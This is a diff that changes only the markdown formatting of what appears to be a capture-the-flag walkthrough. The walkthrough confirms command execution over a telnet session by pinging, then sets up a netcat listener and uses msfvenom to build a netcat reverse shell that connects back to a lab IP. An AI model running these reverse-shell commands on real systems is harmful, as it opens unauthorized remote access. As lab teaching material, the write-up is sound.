@@ -46,17 +46,17 @@ First we check if what we're typing is being executed as system commands:
 1. Start tcpdump listener on local machine - ``sudo tcpdump ip proto \\icmp -i eth0`` (if using openVPN use tun0 instead of eth0).
 2. Ping from telnet session - ``.RUN ping 10.10.46.47 -c 1``
 
-Received ping on listener so system commands executed on telnet session are working.
+*Received ping on listener so system commands executed on telnet session are working.*
 
-Generate reverse shell payload using msfvenom on local machine, this will generate and encode netcat reverse shell for us.
+Generate reverse shell payload using **msfvenom** on local machine, this will generate and encode netcat reverse shell for us.
 
 ![image](https://user-images.githubusercontent.com/80155116/111870127-ba3de000-89e7-11eb-9b89-de7a2a8055d1.png)
 
-Start netcat listener on local machine 
+Start **netcat listener** on local machine:
 
 ``nc -lvp 4444``
 
-Copy paste the msfvenom payload and run it in telnet session
+Copy paste the **msfvenom** payload and run it in telnet session:
 
 ``.RUN msfvenom -p cmd/unix/reverse_netcat lhost=10.10.64.206 lport=4444 R``
 
